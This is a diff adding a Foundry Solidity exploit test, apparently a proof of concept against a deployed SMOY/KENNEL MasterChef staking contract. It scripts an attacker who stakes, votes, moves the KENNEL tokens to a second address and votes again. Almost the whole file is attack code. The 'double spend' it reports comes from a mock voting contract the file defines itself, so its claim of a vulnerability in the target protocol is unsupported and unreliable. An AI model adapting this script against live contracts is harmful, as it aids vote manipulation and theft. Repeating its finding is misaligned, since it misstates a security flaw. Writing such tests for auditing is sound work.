@@ -1,0 +1,129 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Required interfaces from source code
+interface ISamoyedMasterChef {
+    function smoy() external view returns (address);
+    function kennel() external view returns (address);
+    function enterStaking(uint256 _amount) external;
+    function leaveStaking(uint256 _amount) external;
+    function userInfo(uint256 _pid, address _user) external view returns (uint256 amount, uint256 rewardDebt);
+    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSmoyPerShare, uint256 minDepositFeeRate, uint256 maxDepositFeeRate, bool enabled);
+}
+
+interface ISamoyToken {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IKennelClub {
+    function mint(address _to, uint256 _amount) external;
+    function burn(address _from, uint256 _amount) external;
+    function safeSmoyTransfer(address _to, uint256 _amount) external;
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+// Mock voting contract that uses KennelClub balance for voting
+contract MockVoter {
+    IKennelClub public kennel;
+    mapping(address => bool) public hasVoted;
+    uint256 public totalVotes;
+
+    constructor(IConnectedKennelClub _kennel) {
+        kennel = IKennelClub(_kennel);
+    }
+
+    function vote() external {
+        require(!hasVoted[msg.sender], "Already voted");
+        require(kennel.balanceOf(msg.sender) >= 1 ether, "Must hold at least 1 KENNEL");
+        hasVoted[msg.sender] = true;
+        totalVotes++;
+    }
+}
+
+// Helper to connect interfaces (same as IKennelClub)
+interface IConnectedKennelClub {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant MASTER_CHEF = 0x5D21D02378670119453530478288AEe67b807e2a;
+    ISamoyedMasterChef masterChef = ISamoyedMasterChef(MASTER_CHEF);
+    ISamoyToken smoy;
+    IKennelClub kennel;
+    MockVoter voter;
+    address attacker = address(0xDEAD);
+    address recipient = address(0xBEEF);
+    uint256 constant STAKE_AMOUNT = 100 ether;
+
+    function setUp() public {
+        // Fetch token addresses from MasterChef
+        smoy = ISamoyToken(masterChef.smoy());
+        kennel = IKennelClub(masterChef.kennel());
+
+        // Deploy mock voting contract
+        voter = new MockVoter(IConnectedKennelClub(address(kennel)));
+
+        // Give attacker SMOY tokens
+        deal(address(smoy), attacker, STAKE_AMOUNT * 2);
+
+        // Label addresses for debugging
+        vm.label(address(smoy), "SMOY");
+        vm.label(address(kennel), "KENNEL");
+        vm.label(MASTER_CHEF, "MasterChef");
+        vm.label(attacker, "Attacker");
+        vm.label(recipient, "Recipient");
+        vm.label(address(voter), "Voter");
+    }
+
+    function testDoubleSpendVoting() public {
+        // Step 1: Attacker stakes SMOY and gets KENNEL tokens
+        vm.startPrank(attacker);
+        smoy.approve(MASTER_CHEF, STAKE_AMOUNT);
+        masterChef.enterStaking(STAKE_AMOUNT);
+        vm.stopPrank();
+
+        uint256 kennelBalance = kennel.balanceOf(attacker);
+        assertEq(kennelBalance, STAKE_AMOUNT, "Attacker should have KENNEL equal to stake");
+
+        // Step 2: Attacker votes (uses entire KENNEL balance)
+        vm.prank(attacker);
+        voter.vote();
+        assertEq(voter.totalVotes(), 1, "Attacker voted");
+
+        // Step 3: Attacker transfers all KENNEL to recipient
+        vm.prank(attacker);
+        kennel.transfer(recipient, kennelBalance);
+
+        // Attacker now has 0 KENNEL, recipient has full amount
+        assertEq(kennel.balanceOf(attacker), 0, "Attacker KENNEL balance should be 0");
+        assertEq(kennel.balanceOf(recipient), kennelBalance, "Recipient should have all KENNEL");
+
+        // Step 4: Recipient votes with the same KENNEL tokens (double spend!)
+        vm.prank(recipient);
+        voter.vote();
+
+        // Two different addresses have voted using the same underlying KENNEL tokens
+        assertEq(voter.totalVotes(), 2, "Both voted - double spend achieved");
+
+        // Step 5: Demonstrate that the original stake is still locked in MasterChef
+        (uint256 userAmount, ) = masterChef.userInfo(0, attacker);
+        assertEq(userAmount, STAKE_AMOUNT, "Attacker still has SMOY staked");
+
+        // Attacker cannot withdraw because they no longer hold KENNEL (burn will fail)
+        vm.expectRevert();
+        vm.prank(attacker);
+        masterChef.leaveStaking(STAKE_AMOUNT);
+
+        // The root cause: delegation/token transfer is not accounted for in voting or staking logic.
+        // This is an improper delegation handling vulnerability.
+    }
+}
+```
